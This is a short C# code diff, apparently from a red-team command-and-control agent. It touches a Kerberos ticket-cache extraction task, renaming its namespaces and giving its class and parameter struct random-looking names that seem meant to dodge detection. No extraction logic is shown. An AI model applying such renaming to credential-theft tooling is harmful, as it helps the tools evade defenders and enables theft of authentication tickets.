@@ -9,18 +9,18 @@
 using System;
 using System.Collections.Generic;
 using System.Runtime.Serialization;
-using ApolloInterop.Classes;
-using ApolloInterop.Features.KerberosTickets;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Utils;
+using PhantomInterop.Classes;
+using PhantomInterop.Features.KerberosTickets;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Utils;
 
 namespace Tasks;
 
-public class ticket_cache_extract : Tasking
+public class ShadowTransformer99C3 : Tasking
 {
     [DataContract]
-    internal struct TicketExtractParameters
+    internal struct TacticalEngine8D40
     {
         [DataMember(Name = "luid")]
         internal string? luid;
